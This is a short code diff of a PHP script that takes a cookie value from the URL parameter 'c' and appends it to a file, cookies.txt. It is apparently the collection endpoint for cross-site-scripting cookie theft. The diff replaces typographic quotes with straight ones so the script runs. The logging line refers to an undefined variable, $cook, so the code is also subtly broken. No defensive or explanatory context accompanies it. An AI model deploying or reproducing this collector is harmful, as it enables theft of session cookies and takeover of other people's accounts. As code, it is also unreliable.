@@ -1,9 +1,9 @@
 <?php
-$cookie = $_GET[«c»]; 
+$cookie = $_GET["c"]; 
 if($cookie){
 
-$fp = fopen(«cookies.txt»,»a»); 
+  $fp = fopen("cookies.txt","a"); 
 
-fputs($fp,$cook . «\r\n»);  
-fclose($fp); 
+  fputs($fp,$cook . "\r\n");  
+  fclose($fp); 
 }?>
